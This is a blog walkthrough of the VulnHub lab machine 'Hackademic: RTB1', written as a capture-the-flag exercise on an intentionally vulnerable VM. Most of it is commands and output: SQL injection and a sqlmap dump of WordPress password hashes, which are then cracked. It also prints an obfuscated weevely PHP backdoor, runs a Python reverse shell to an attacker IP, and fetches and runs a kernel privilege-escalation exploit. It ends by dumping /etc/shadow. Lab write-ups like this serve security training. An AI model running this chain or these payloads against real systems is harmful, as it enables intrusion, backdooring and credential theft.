---
layout: post
title: "Hackademic: RTB1"
date: 2015-05-29 14:32:12 +0200
comments: true
categories: [vulnhub, hackademic]
---
Image: [Hackademic: RTB1](https://www.vulnhub.com/entry/hackademic-rtb1,17/)

We gained the IP address 192.168.80.146 for our testing target.

Nmap output:
{% codeblock %}
root@kali32:~# nmap 192.168.80.146 -sV -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 17:14 CEST
Nmap scan report for 192.168.80.146
Host is up (0.00032s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
MAC Address: 00:0C:29:01:8A:4D (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds
{% endcodeblock %}

Nikto output:
{% codeblock %}
root@kali32:~# nikto -h 192.168.80.146 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.80.146
+ Target Hostname:    192.168.80.146
+ Target Port:        80
+ Start Time:         2015-04-28 17:18:04 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (Fedora)
+ Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011
+ The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7354 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endcodeblock %}

There was SQL injection on the web page, vulnerable wordpress instance:
{% codeblock %}
http://192.168.80.146/Hackademic_RTB1/?cat=1'
SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1
{% endcodeblock %}

This will take longer and it's not necessery to dump everything:
{% codeblock %}
root@kali32:~# sqlmap -u "http://192.168.80.146/Hackademic_RTB1/?cat=1" --dump-all
{% endcodeblock %}

Some of the output:
{% codeblock %}
--current-user:
current user:    'root@localhost'
--current-db:
current database:    'wordpress'
--privileges:
[*] 'root'@'localhost' (administrator) [27]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
--passwords:
database management system users password hashes:
[*] root [1]:
    password hash: 2eaec110380126d7
{% endcodeblock %}

The wordpress could be scanned using wpscan too:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan http://192.168.80.146/Hackademic_RTB1
{% endcodeblock %}

{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv 
ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
1,login,<blank>,0,<blank>,<blank>,http://,<blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,<blank>,<blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,<blank>,<blank>
2,login,<blank>,0,<blank>,<blank>,http://,<blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,<blank>,<blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,<blank>,<blank>
3,nickname,<blank>,0,<blank>,<blank>,http://,<blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,<blank>,<blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,<blank>,<blank>
4,nickname,<blank>,0,<blank>,<blank>,http://,<blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,<blank>,<blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,<blank>,<blank>
5,nickname,<blank>,0,<blank>,<blank>,http://,<blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,<blank>,<blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,<blank>,<blank>
6,nickname,<blank>,0,<blank>,<blank>,http://,<blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,<blank>,<blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,<blank>,<blank>
{% endcodeblock %}

"GeorgeMiller:q1w2e3" has the highest privileges (user_level 10).

We crack the hashes:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep "^[0-9]+" wp_users.csv| awk -F, '{print $10 ":"  $9}'  > /tmp/wp_users.john
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john --format=raw-md5 
Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
NickJames:admin
JohnSmith:PUPPIES
GeorgeMiller:q1w2e3
TonyBlack:napoleon
JasonKonnors:maxwell
MaxBucky:kernel
guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
Use the "--show" option to display all of the cracked passwords reliably
{% endcodeblock %}

We log in using GeorgeMiller's account and under "Manage -> Files" we upload the generated weevely shell:
{% codeblock lang:bash %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
[generate.php] Backdoor file 'weevely.php' created with password '1234'
{% endcodeblock %}

{% codeblock lang:php %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat weevely.php 
<?php
$duiq = str_replace("sc","","scssctscrsc_scrsceplscasccsce");
$lucw="MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh";
$udtq="JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG";
$foif="IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30=";
$kvzf="wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs";
$tkjs = $duiq("v", "", "bvavsve6v4v_vdvevcvovdve");
$nqkm = $duiq("d","","dcdrdedatded_fudncdtdidodn");
$itsd = $nqkm('', $tkjs($duiq("woh", "", $udtq.$lucw.$kvzf.$foif))); $itsd();
?>
{% endcodeblock %}

We connect using weevely and found out the mysql root password:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php 1234

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
apache:x:48:489:Apache:/var/www:/sbin/nologin
saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gdm:x:42:481::/var/lib/gdm:/sbin/nologin
p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
{% endcodeblock %}


{% codeblock lang:php %}
@HackademicRTB1:/var/www/html/Hackademic_RTB1 $ cat wp-config.php
<?php
// ** MySQL settings ** //
define('DB_NAME', 'wordpress');     // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', 'lz5yedns'); // ...and password
define('DB_HOST', 'localhost');     // 99% chance you won't need to change this value

// Change the prefix if you want to have multiple blogs in a single database.
$table_prefix  = 'wp_';   // example: 'wp_' or 'b2' or 'mylogin_'

// Change this to localize WordPress.  A corresponding MO file for the
// chosen language must be installed to wp-includes/languages.
// For example, install de.mo to wp-includes/languages and set WPLANG to 'de'
// to enable German language support.
define ('WPLANG', '');

/* Stop editing */

define('ABSPATH', dirname(__FILE__).'/');
require_once(ABSPATH.'wp-settings.php');
?>
{% endcodeblock %}

Because our web shell doesn't have assigned tty, we use python to create another reverse shell:
{% codeblock lang:bash %}
@HackademicRTB1:/tmp $ sudo -l
sudo: sorry, you must have a tty to run sudo
{% endcodeblock %}

{% codeblock lang:python %}
root@kali32:~# nc -lp 1338

@HackademicRTB1:/tmp $ python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1338
{% endcodeblock %}

For privilege escalation, we use the following exploit:
{% codeblock lang:c %}
root@kali32:/usr/share/exploitdb# head platforms/linux/local/15285.c 
//source: http://www.vsecurity.com/resources/advisory/20101019-1/

/* 
 * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg <drosenberg@vsecurity.com>
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
{% endcodeblock %}

{% codeblock lang:bash %}
bash-4.0$ wget --no-check-certificate https://www.exploit-db.com/download/15285 -O a.c
bash-4.0$ gcc a.c
gcc a.c
bash-4.0$ ./a.out
./a.out
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# id
id
uid=0(root) gid=0(root)

sh-4.0# cat /etc/shadow
cat /etc/shadow
root:$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
bin:*:14495:0:99999:7:::
daemon:*:14495:0:99999:7:::
adm:*:14495:0:99999:7:::
lp:*:14495:0:99999:7:::
sync:*:14495:0:99999:7:::
shutdown:*:14495:0:99999:7:::
halt:*:14495:0:99999:7:::
mail:*:14495:0:99999:7:::
uucp:*:14495:0:99999:7:::
operator:*:14495:0:99999:7:::
games:*:14495:0:99999:7:::
gopher:*:14495:0:99999:7:::
ftp:*:14495:0:99999:7:::
nobody:*:14495:0:99999:7:::
vcsa:!!:14557::::::
avahi-autoipd:!!:14557::::::
ntp:!!:14557::::::
dbus:!!:14557::::::
rtkit:!!:14557::::::
nscd:!!:14557::::::
tcpdump:!!:14557::::::
avahi:!!:14557::::::
haldaemon:!!:14557::::::
openvpn:!!:14557::::::
apache:!!:14557::::::
saslauth:!!:14557::::::
mailnull:!!:14557::::::
smmsp:!!:14557::::::
smolt:!!:14557::::::
sshd:!!:14557::::::
pulse:!!:14557::::::
gdm:!!:14557::::::
p0wnbox.Team:$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76/:14981:0:99999:7:::
mysql:!!:14981::::::
{% endcodeblock %}
